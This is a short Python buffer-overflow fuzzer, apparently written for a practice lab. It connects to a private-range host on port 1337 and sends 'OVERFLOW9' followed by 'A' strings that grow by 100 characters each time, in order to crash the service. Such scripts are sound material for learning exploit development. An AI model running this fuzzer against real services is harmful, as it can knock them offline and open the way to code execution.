#!/usr/bin/python3

import socket


ip="10.10.11.181"
port=1337


lista=["A"]
quant=100

while len(lista) <= 50:
    lista.append("A" * quant)
    quant = quant + 100
for dados in lista:
    print("FUZZING com OVERFLOW9 %s" %len(dados))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.recv(1024)
    s.send(b"OVERFLOW9 "+ dados.encode() +b"\r\n")
